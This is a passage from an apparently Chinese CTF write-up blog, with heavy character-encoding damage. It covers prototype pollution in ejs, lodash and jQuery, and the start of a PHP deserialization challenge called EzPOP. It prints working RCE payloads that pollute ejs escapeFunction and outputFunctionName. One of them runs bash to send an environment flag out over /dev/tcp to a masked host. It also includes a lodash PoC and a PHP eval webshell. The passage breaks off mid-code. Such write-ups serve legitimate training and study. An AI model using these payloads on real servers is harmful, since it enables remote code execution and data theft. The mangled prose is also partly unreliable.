class="hljs-keyword">session</span>.userid )&#123;        res.redirect(<span class="hljs-number">302</span>,&quot;/login&quot;);    &#125; <span class="hljs-keyword">else</span>&#123;        next();    &#125;    &#125;</code></pre><p>authå‡½æ•°ä»…é€šè¿‡req.session.loginã€req.session.useridåˆ¤æ–­ç™»å½•ï¼Œæˆ‘ä»¬åªè¦æ±¡æŸ“loginå’Œuseridä¸¤ä¸ªå±æ€§ï¼Œå°±å¯ä»¥ä»»æ„ç™»å½•äº†ã€‚</p><p>ä»ä»£ç å¯çœ‹å‡ºæœ¬é¢˜ä»¥ejsåº“ä½œä¸ºæ¨¡ç‰ˆå¼•æ“ï¼Œæ‰¾ä¸€ä¸‹å¯åˆ©ç”¨ç‚¹ï¼›å‡½æ•°<strong>Template</strong>ï¼š</p><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> <span class="hljs-keyword">Template</span>(<span class="hljs-type">text</span>, opts) &#123;  opts = opts || &#123;&#125;;  var <span class="hljs-keyword">options</span> = &#123;&#125;;  this.templateText = <span class="hljs-type">text</span>;  this.mode = <span class="hljs-keyword">null</span>;  this.<span class="hljs-keyword">truncate</span> = <span class="hljs-keyword">false</span>;  this.currentLine = <span class="hljs-number">1</span>;  this.source = <span class="hljs-string">&#x27;&#x27;</span>;  this.dependencies = [];  <span class="hljs-keyword">options</span>.client = opts.client || <span class="hljs-keyword">false</span>;  <span class="hljs-keyword">options</span>.escapeFunction = opts.<span class="hljs-keyword">escape</span> || opts.escapeFunction || utils.escapeXML;  <span class="hljs-keyword">options</span>.compileDebug = opts.compileDebug !== <span class="hljs-keyword">false</span>;  <span class="hljs-keyword">options</span>.<span class="hljs-keyword">debug</span> = !!opts.<span class="hljs-keyword">debug</span>;  <span class="hljs-keyword">options</span>.filename = opts.filename;  <span class="hljs-keyword">options</span>.openDelimiter = opts.openDelimiter || exports.openDelimiter || _DEFAULT_OPEN_DELIMITER;  <span class="hljs-keyword">options</span>.closeDelimiter = opts.closeDelimiter || exports.closeDelimiter || _DEFAULT_CLOSE_DELIMITER;  <span class="hljs-keyword">options</span>.delimiter = opts.<span class="hljs-keyword">delimiter</span> || exports.<span class="hljs-keyword">delimiter</span> || _DEFAULT_DELIMITER;  <span class="hljs-keyword">options</span>.<span class="hljs-keyword">strict</span> = opts.<span class="hljs-keyword">strict</span> || <span class="hljs-keyword">false</span>;  <span class="hljs-keyword">options</span>.context = opts.context;  <span class="hljs-keyword">options</span>.cache = opts.cache || <span class="hljs-keyword">false</span>;  <span class="hljs-keyword">options</span>.rmWhitespace = opts.rmWhitespace;  <span class="hljs-keyword">options</span>.root = opts.root;  <span class="hljs-keyword">options</span>.outputFunctionName = opts.outputFunctionName;  <span class="hljs-keyword">options</span>.localsName = opts.localsName || exports.localsName || _DEFAULT_LOCALS_NAME;  <span class="hljs-keyword">options</span>.views = opts.views;  <span class="hljs-keyword">options</span>.async = opts.async;</code></pre><p>è¿™äº›å˜é‡æ¥è‡ªäºå¯¹è±¡<code>opt</code>ï¼Œå¹¶ä¸”è¿™äº›å˜é‡ä¸€å¼€å§‹åœ¨<code>Object</code>ä¸­éƒ½ä¸ºç©ºã€‚æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å¯¹è¿™äº›å˜é‡é€ä¸€è·Ÿè¸ªï¼Œçœ‹çœ‹å“ªä¸ªæ‹¼æ¥åˆ°äº†æ¨¡æ¿ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ±¡æŸ“è¿™äº›å˜é‡ï¼Œæ¸²æŸ“è¿‡ç¨‹ç”±äºå­˜åœ¨<strong>eval</strong>ï¼Œä»è€Œè¿›è¡Œ RCE</p><h4 id="åç«¯RCE-opts-escapeFunction"><a class="header-anchor" href="#åç«¯RCE-opts-escapeFunction">ğŸ­</a>åç«¯RCE||opts.escapeFunction</h4><p>è·Ÿè¸ªopts.escapeFunctionï¼š</p><pre><code class="hljs ini"><span class="hljs-attr">options.escapeFunction</span> = opts.escape || opts.escapeFunction || utils.escapeXML<span class="hljs-comment">;</span></code></pre><p>å‡ºç°åœ¨Templateçš„åŸå‹ä¸­çš„æ–¹æ³•ï¼šcompile</p><pre><code class="hljs arcade">compile: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123; ...  <span class="hljs-keyword">var</span> escapeFn = opts.escapeFunction;</code></pre><p>èµ‹å€¼ç»™äº†å˜é‡<code>escapeFn</code>ï¼Œè·Ÿè¿›ï¼ŒåŒæ ·åœ¨<strong>compile</strong>æ‰¾åˆ°äº†ï¼š</p><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (opts.client) &#123;      <span class="hljs-attribute">src</span> = <span class="hljs-string">&#x27;escapeFn = escapeFn || &#x27;</span> + escapeFn.toString() + <span class="hljs-string">&#x27;;&#x27;</span> + <span class="hljs-string">&#x27;n&#x27;</span> + src;      <span class="hljs-attribute">if</span> (opts.compileDebug) &#123;        <span class="hljs-attribute">src</span> = <span class="hljs-string">&#x27;rethrow = rethrow || &#x27;</span> + rethrow.toString() + <span class="hljs-string">&#x27;;&#x27;</span> + <span class="hljs-string">&#x27;n&#x27;</span> + src;      &#125;    &#125;</code></pre><p>å¦‚æœ<code>opts.client</code>å­˜åœ¨ï¼Œåˆ™å°†<code>escapeFn</code>æ‹¼æ¥åˆ°<code>src</code>ä¸­ï¼Œç„¶åæ ¹æ®æ‹¼æ¥çš„å†…å®¹ï¼Œç”ŸæˆåŠ¨æ€å‡½æ•°ï¼š</p><pre><code class="hljs php"><span class="hljs-keyword">else</span> &#123;    ctor = <span class="hljs-function"><span class="hljs-keyword">Function</span></span>;&#125;<span class="hljs-function"><span class="hljs-keyword">fn</span> = <span class="hljs-title">new</span> <span class="hljs-title">ctor</span>(<span class="hljs-params">opts.localsName + <span class="hljs-string">&#x27;, escapeFn, include, rethrow&#x27;</span>, src</span>)</span>;</code></pre><p>å¦‚æœå¯ä»¥æ§åˆ¶<code>opts.escapeFunction</code>çš„å†…å®¹ä¸ºæ¶æ„ä»£ç ï¼Œå³å¯é€šè¿‡ ejs æ¨¡æ¿æ¸²æŸ“è¿›è¡Œ RCE</p><p>payloadï¼š</p><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;notice&quot;</span>,<span class="hljs-attr">&quot;content&quot;</span>:&#123;<span class="hljs-attr">&quot;constructor&quot;</span>:&#123;<span class="hljs-attr">&quot;prototype&quot;</span>:&#123;<span class="hljs-attr">&quot;client&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">&quot;escapeFunction&quot;</span>:<span class="hljs-string">&quot;1; return process.env.FLAG&quot;</span>&#125;&#125;&#125;&#125;</code></pre><p>é€šè¿‡<code>/add</code>å°† json æ ¼å¼çš„ payload ä¼ é€’ç»™æœåŠ¡å™¨</p><p><img src="/2021/08/20/hjs/5.png" alt="5"></p><p>æ‰“6æ¬¡åéšä¾¿è®¿é—®ä¸€ä¸ªå¸¦æœ‰<code>app.render()</code>æ¸²æŸ“ä»£ç çš„è·¯ç”±ï¼Œè¿›è¡Œæ¨¡æ¿æ¸²æŸ“ï¼š</p><img src="/2021/08/20/hjs/6.png" alt="6" style="zoom:67%;"><h4 id="åç«¯RCE-outputFuncationName"><a class="header-anchor" href="#åç«¯RCE-outputFuncationName">ğŸ­</a>åç«¯RCE||outputFuncationName</h4><p>ä¸€æ ·è·Ÿåˆ°<strong>compile</strong>ï¼š</p><pre><code class="hljs kotlin"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.source) &#123;    <span class="hljs-keyword">this</span>.generateSource();    prepended += <span class="hljs-string">&#x27;  var __output = [], __append = __output.push.bind(__output);&#x27;</span> + <span class="hljs-string">&#x27;n&#x27;</span>;    <span class="hljs-keyword">if</span> (opts.outputFunctionName) &#123;        prepended += <span class="hljs-string">&#x27;  var &#x27;</span> + opts.outputFunctionName + <span class="hljs-string">&#x27; = __append;&#x27;</span> + <span class="hljs-string">&#x27;n&#x27;</span>;    &#125;    ...    <span class="hljs-keyword">this</span>.source = prepended + <span class="hljs-keyword">this</span>.source + appended;&#125;</code></pre><p>å¦‚æœ<code>this.source</code>ä¸å­˜åœ¨ï¼Œåˆ™æ‰§è¡Œ<code>prepended += '  var ' + opts.outputFunctionName + ' = __append;' + 'n';</code>ï¼Œå°†<code>opts.outputFunctionName</code>æ‹¼æ¥åˆ°å˜é‡<code>prepended</code>ä¸­ï¼Œç„¶åæœ«å°¾åˆå°†<code>prepended</code>æ‹¼æ¥åˆ°<code>this.source</code>ã€‚ç»§ç»­è·Ÿè¸ª<code>this.source</code>ï¼š</p><pre><code class="hljs gradle"><span class="hljs-keyword">if</span> (opts.compileDebug) &#123; ...&#125;<span class="hljs-keyword">else</span>&#123;    src = <span class="hljs-keyword">this</span>.<span class="hljs-keyword">source</span>;&#125;</code></pre><p><code>opts.compileDebug</code>ä¸å­˜åœ¨æ—¶ï¼Œå°†<code>this.source</code>èµ‹å€¼ç»™<code>src</code>ï¼Œæœ€åä¸€æ ·å¸¦å…¥äº†<code>fn = new ctor(opts.localsName + ', escapeFn, include, rethrow', src);</code>åŠ¨æ€å‡½æ•°</p><p>åŒæ ·æ„é€  payloadï¼š</p><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;mmp&quot;</span>,<span class="hljs-attr">&quot;content&quot;</span>:&#123;<span class="hljs-attr">&quot;constructor&quot;</span>:&#123;<span class="hljs-attr">&quot;prototype&quot;</span>:&#123;<span class="hljs-attr">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;a=1;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c &quot;</span>echo $FLAG&gt;/dev/tcp/xxxxx/xx<span class="hljs-string">&quot;&#x27;)//&quot;</span>&#125;&#125;&#125;&#125;</code></pre><h4 id="JQueryä¸­-extendæ±¡æŸ“-å‰ç«¯XXS"><a class="header-anchor" href="#JQueryä¸­-extendæ±¡æŸ“-å‰ç«¯XXS">ğŸ­</a>JQueryä¸­$.extendæ±¡æŸ“+å‰ç«¯XXS</h4><h5 id="loadsh-åº“çš„åŸå‹é“¾æ±¡æŸ“æ¼æ´"><a class="header-anchor" href="#loadsh-åº“çš„åŸå‹é“¾æ±¡æŸ“æ¼æ´">ğŸ­</a>loadsh åº“çš„åŸå‹é“¾æ±¡æŸ“æ¼æ´</h5><pre><code class="hljs javascript">lodash.defaultsDeep(doms,<span class="hljs-built_in">JSON</span>.parse( raws[i].dom ));</code></pre><p>lodash æ˜¯ä¸€ä¸ªéå¸¸æµè¡Œçš„JavaScript å®ç”¨åŸç”Ÿåº“ï¼Œä¸éœ€è¦å¼•å…¥å…¶ä»–ç¬¬ä¸‰æ–¹ä¾èµ–ï¼Œæ­¤è½¯ä»¶åŒ…çš„ï¼œ4.17.12ç‰ˆæœ¬ä¼šå—åˆ°åŸå‹æ±¡æŸ“çš„å½±å“ã€‚å®ƒæœ‰ä¸€ä¸ªç»å…¸çš„åŸå‹é“¾æ±¡æŸ“æ¼æ´<code>CVE-2019-10744</code>ï¼š</p><p>åœ¨Lodashåº“ä¸­defaultsDeepå‡½æ•°å¯ä»¥è¿›è¡Œæ„é€ å‡½æ•°ï¼ˆconstructorï¼‰é‡è½½ï¼Œé€šè¿‡æ„é€ å‡½æ•°é‡è½½çš„æ–¹å¼å¯ä»¥æ¬ºéª—æ·»åŠ æˆ–ä¿®æ”¹Object.prototypeçš„å±æ€§ï¼Œè¿™ä¸ªæ€§è´¨å¯ä»¥è¢«ç”¨äºåŸå‹æ±¡æŸ“ã€‚</p><p>POC</p><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> mergeFn = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>).defaultsDeep;<span class="hljs-keyword">const</span> payload = <span class="hljs-string">&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;a0&quot;: true&#125;&#125;&#125;&#x27;</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>) </span>&#123;    mergeFn(&#123;&#125;, <span class="hljs-built_in">JSON</span>.parse(payload));    <span class="hljs-keyword">if</span> ((&#123;&#125;)[<span class="hljs-string">`a0`</span>] === <span class="hljs-literal">true</span>) &#123;        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Vulnerable to Prototype Pollution via <span class="hljs-subst">$&#123;payload&#125;</span>`</span>);    &#125;  &#125;check();</code></pre><p>æ¼æ´å…³é”®è§¦å‘ç‚¹åœ¨defaultsDeepå‡½æ•°ï¼Œå®ƒå°†<code>(&#123;&#125;, JSON.parse(payload))</code>mergeæ—¶ï¼Œå°±å¯èƒ½å¯¼è‡´åŸå‹é“¾æ±¡æŸ“ã€‚ä½¿ç”¨JSON.parseå°±æ˜¯ä¿è¯åˆå¹¶æ—¶èƒ½ä»¥å­—å…¸è§£æï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸²ã€‚</p><h5 id="JQuery-åŸå‹é“¾æ±¡æŸ“"><a class="header-anchor" href="#JQuery-åŸå‹é“¾æ±¡æŸ“">ğŸ­</a>JQuery åŸå‹é“¾æ±¡æŸ“</h5><p>JQuery æ˜¯ä¸€ä¸ªJså‰ç«¯å·¥å…·åº“ï¼Œå­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ï¼ŒCVEï¼š<a href="https://www.cvedetails.com/cve/CVE-2019-11358/">CVE-2019-11358</a>ï¼Œ ç‰ˆæœ¬å°äº3.4.0æ—¶</p><p><img src="/2021/08/20/hjs/7.png" alt="7"></p><p><code>$.extend(true,&#123;&#125;,JSON.parse('&#123;&quot;__proto__&quot;:&#123;&quot;aa&quot;:&quot;hello&quot;&#125;&#125;'))</code> Jqueryå¯ä»¥ç”¨$.extendå°†ä¸¤ä¸ªå­—å…¸mergeï¼Œè€Œè¿™ä¹Ÿå› æ­¤æ±¡æŸ“äº†åŸå‹é“¾ã€‚</p><h5 id="åˆ†æ"><a class="header-anchor" href="#åˆ†æ">ğŸ­</a>åˆ†æ</h5><p>å‰ç«¯è·å–åå°æ•°æ®æ—¶è°ƒç”¨äº†<code>$.extent</code>å‡½æ•°mergeæ•°æ®ï¼š</p><pre><code class="hljs arcade"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAll</span>(<span class="hljs-params">allNode</span>)</span>&#123;    $.ajax(&#123;        url:<span class="hljs-string">&quot;/get&quot;</span>,        type:<span class="hljs-string">&quot;get&quot;</span>,        async:<span class="hljs-literal">false</span>,        success: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">datas</span>)</span>&#123;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span> ;i&lt;datas.length; i++)&#123;                $.extend(<span class="hljs-literal">true</span>,allNode,datas[i])            &#125;            <span class="hljs-comment">// console.log(allNode);</span>        &#125;    &#125;)&#125;</code></pre><p>jsç”Ÿæˆæ¨¡æ¿æ—¶ï¼Œéå†äº†hintsæ•°ç»„å¹¶å°†hintsæ•°ç»„é‡Œé¢çš„å†…å®¹å†™å…¥åˆ°å¯¹åº”liæ ‡ç­¾ä¸­ã€‚</p><pre><code class="hljs clojure">(<span class="hljs-name">function</span>()&#123;        var hints = &#123;            header : <span class="hljs-string">&quot;è‡ªå®šä¹‰å†…å®¹&quot;</span>,            notice: <span class="hljs-string">&quot;è‡ªå®šä¹‰å…¬å‘Š&quot;</span>,            wiki : <span class="hljs-string">&quot;è‡ªå®šä¹‰wiki&quot;</span>,            button:<span class="hljs-string">&quot;è‡ªå®šä¹‰å†…å®¹&quot;</span>,            message: <span class="hljs-string">&quot;è‡ªå®šä¹‰ç•™è¨€å†…å®¹&quot;</span>        &#125;<span class="hljs-comment">;</span>        for(<span class="hljs-name"><span class="hljs-builtin-name">key</span></span> in hints)&#123;            // console.log(<span class="hljs-name"><span class="hljs-builtin-name">key</span></span>)<span class="hljs-comment">;</span>            element = $(<span class="hljs-string">&quot;li[type=&#x27;&quot;</span>+key+<span class="hljs-string">&quot;&#x27;]&quot;</span>)<span class="hljs-comment">; </span>            if(<span class="hljs-name">element</span>)&#123;                element.find(<span class="hljs-string">&quot;span.content&quot;</span>).html(<span class="hljs-name">hints</span>[key])<span class="hljs-comment">;</span>            &#125;        &#125;    &#125;)()<span class="hljs-comment">;</span></code></pre><p>index.ejsä¸­ï¼Œå«æœ‰typeå±æ€§çš„liæ ‡ç­¾é™¤äº†ä¸Šé¢å†™çš„äº”ä¸ªè¿˜æœ‰ä¸€ä¸ªlogger</p><pre><code class="hljs scala">&lt;li <span class="hljs-class"><span class="hljs-keyword">type</span></span>=<span class="hljs-string">&quot;logger&quot;</span>&gt;          &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;col-sm-12 col-sm-centered&quot;</span>&gt;              &lt;pre <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;am-pre-scrollable&quot;</span>&gt;                  &lt;span <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;am-text-success&quot;</span>&gt;[<span class="hljs-type">Tue</span> <span class="hljs-type">Jan</span> <span class="hljs-number">11</span> <span class="hljs-number">17</span>:<span class="hljs-number">32</span>:<span class="hljs-number">52</span> <span class="hljs-number">9</span>]&lt;/span&gt; &lt;span <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;am-text-danger&quot;</span>&gt;[info]&lt;/span&gt; &lt;span <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;content&quot;</span>&gt;<span class="hljs-type">StoreHtml</span> init success .....&lt;/span&gt;              &lt;/pre&gt;</code></pre><p>æ€è·¯ï¼šæ±¡æŸ“loggerå˜é‡ï¼Œä½¿å¾—hintså«æœ‰loggerå±æ€§ï¼Œä»è€Œå°†loggerå†…å®¹æ‰“å°åˆ°é¡µé¢ä¸­å®ç°XSSï¼Œç»•è¿‡ç™»å½•éªŒè¯è¶Šæƒç™»å½•admin,è¦†ç›–<code>login</code>ä¸<code>userid</code>ã€‚</p><p>å‚è€ƒï¼š<a href="https://blog.szfszf.top/tech/javascript-%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93-%e5%88%86%e6%9e%90/">https://blog.szfszf.top/tech/javascript-åŸå‹é“¾æ±¡æŸ“-åˆ†æ/</a></p><p><a href="https://blog.csdn.net/qq_42181428/article/details/100659865">https://blog.csdn.net/qq_42181428/article/details/100659865</a></p><h1>[EIS 2019]EzPOP</h1><p>é¢˜ç›®ç»™äº†æºç ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;    <span class="hljs-keyword">protected</span> $store;    <span class="hljs-keyword">protected</span> $key;    <span class="hljs-keyword">protected</span> $expire;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$store, $key = <span class="hljs-string">&#x27;flysystem&#x27;</span>, $expire = <span class="hljs-literal">null</span></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;key = $key;        <span class="hljs-keyword">$this</span>-&gt;store = $store;        <span class="hljs-keyword">$this</span>-&gt;expire = $expire;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $contents</span>) </span>&#123;        $cachedProperties = array_flip([            <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;dirname&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>, <span class="hljs-string">&#x27;extension&#x27;</span>, <span class="hljs-string">&#x27;filename&#x27;</span>,            <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;mimetype&#x27;</span>, <span class="hljs-string">&#x27;visibility&#x27;</span>, <span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>,        ]);        <span class="hljs-keyword">foreach</span> ($contents <span class="hljs-keyword">as</span> $path =&gt; $object) &#123;            <span class="hljs-keyword">if</span> (is_array($object)) &#123;                $contents[$path] = array_intersect_key($object, $cachedProperties); <span class="hljs-comment">//æ¯”è¾ƒä¸¤ä¸ªæ•°ç»„çš„é”®åï¼Œå¹¶è¿”å›äº¤é›†</span>            &#125;        &#125;        <span class="hljs-keyword">return</span> $contents;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span>(<span class="hljs-params"></span>) </span>&#123;        $cleaned = <span class="hljs-keyword">$this</span>-&gt;cleanContents(<span class="hljs-keyword">$this</span>-&gt;cache);        <span class="hljs-keyword">return</span> json_encode([$cleaned, <span class="hljs-keyword">$this</span>-&gt;complete]); <span class="hljs-comment">//jsonç¼–ç </span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;        $contents = <span class="hljs-keyword">$this</span>-&gt;getForStorage();        <span class="hljs-keyword">$this</span>-&gt;store-&gt;set(<span class="hljs-keyword">$this</span>-&gt;key, $contents, <span class="hljs-keyword">$this</span>-&gt;expire);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;autosave) &#123;            <span class="hljs-keyword">$this</span>-&gt;save();        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExpireTime</span>(<span class="hljs-params">$expire</span>)</span>&#123; <span class="hljs-comment">//è·å–å¤±æ•ˆæ—¶é—´</span>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) $expire;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> $name</span>) </span>&#123; <span class="hljs-comment">//è®¾ç½®filename</span>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . $name;    &#125;    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params">$data</span>) </span>&#123;         <span class="hljs-keyword">if</span> (is_numeric($data)) &#123;            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) $data;        &#125;        $serialize = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>];        <span class="hljs-keyword">return</span> $serialize($data);<span class="hljs-comment">//å‘½ä»¤æ‰§è¡Œ</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params">$name, $value, $expire = <span class="hljs-literal">null</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;writeTimes++;        <span class="hljs-keyword">if</span> (is_null($expire)) &#123;            $expire = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];        &#125;        $expire = <span class="hljs-keyword">$this</span>-&gt;getExpireTime($expire);        $filename = <span class="hljs-keyword">$this</span>-&gt;getCacheKey($name); <span class="hljs-comment">//è®¾ç½®filename</span>        $dir = dirname($filename);        <span class="hljs-keyword">if</span> (!is_dir($dir)) &#123;            <span class="hljs-keyword">try</span> &#123;                mkdir($dir, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> $e) &#123;                <span class="hljs-comment">// åˆ›å»ºå¤±è´¥</span>            &#125;        &#125;        $data = <span class="hljs-keyword">$this</span>-&gt;serialize($value);        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;            <span class="hljs-comment">//æ•°æ®å‹ç¼©</span>            $data = gzcompress($data, <span class="hljs-number">3</span>);        &#125;        $data = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>, $expire) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . $data;        $result = file_put_contents($filename, $data);        <span class="hljs-keyword">if</span> ($result) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;src&#x27;</span>]))&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;$dir = <span class="hljs-string">&quot;uploads/&quot;</span>;<span class="hljs-keyword">if</span> (!is_dir($dir))&#123;    mkdir($dir);&#125;unserialize($_GET[<span class="hljs-string">&quot;data&quot;</span>]);</code></pre><p>è¿™æ¬¡ä»ä¸‹å¾€ä¸Šçœ‹ï¼š</p><pre><code class="hljs php-template"><span class="xml">$data = &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span>\n<span class="hljs-comment">//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\n exit();<span class="hljs-meta">?&gt;</span></span></span><span class="xml">\n&quot; . $data;</span><span class="xml">$result = file_put_contents($filename, $data);</span></code></pre><p>æ³¨æ„åˆ°<code>file_put_contents</code>åº”è¯¥å¯å†™webshellï¼Œæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå…ˆçœ‹filenameï¼š</p><pre><code class="hljs elixir"><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$this</span>-&gt;getCacheKey(<span class="hljs-variable">$name</span>);</code></pre><p>åœ¨è¿½æº¯ä¸€ä¸‹</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> $name</span>) </span>&#123;         <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . $name;    &#125;</code></pre><p>æ‰€ä»¥<code>$filename = options['prefix'].$name</code>,å†çœ‹dataå‚æ•°ï¼š</p><pre><code class="hljs awk"><span class="hljs-variable">$data</span> = <span class="hljs-variable">$this</span>-&gt;serialize(<span class="hljs-variable">$value</span>);<span class="hljs-regexp">//</span>ç»è¿‡è‡ªå®šä¹‰çš„serializeå‡½æ•°å¤„ç†</code></pre><p>è·Ÿè¿›ä¸€ä¸‹</p><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params">$data</span>) </span>&#123;        <span class="hljs-keyword">if</span> (is_numeric($data)) &#123;           <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) $data;       &#125;       $serialize = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>]; <span class="hljs-comment">//è¡¨æ˜serializeå¯æ§</span>       <span class="hljs-keyword">return</span> $serialize($data);<span class="hljs-comment">//å‡å¦‚$serialize=eval,æ­¤å¤„å¯ä¸ºeval($data)</span>   &#125;</code></pre><p>ç„¶ådataè¿˜è¦å¤„ç†</p><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;<span class="hljs-regexp">//</span>å¯ä»¥è®¾å®šoptions[<span class="hljs-string">&#x27;data_compress&#x27;</span>]=falseï¼Œä¸è¿›å…¥æ•°æ®å‹ç¼©è¿™ä¸€æ­¥            <span class="hljs-regexp">//</span>æ•°æ®å‹ç¼©            <span class="hljs-variable">$data</span> = gzcompress(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);        &#125;<span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;</code></pre><p>æœ€åè¿™æ¡å¤„ç†ä»£ç å¯å‚è€ƒï¼š<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">æ–‡ç« </a>ç»•è¿‡ï¼Œæœ¬åœ°æµ‹è¯•ä¸€ä¸‹ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$expire = <span class="hljs-number">0</span>;$data = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[\&#x27;cmd\&#x27;]);?&gt;&#x27;</span>;$data = <span class="hljs-string">&#x27;aaa&#x27;</span>.base64_encode($data); <span class="hljs-comment">//åŠ 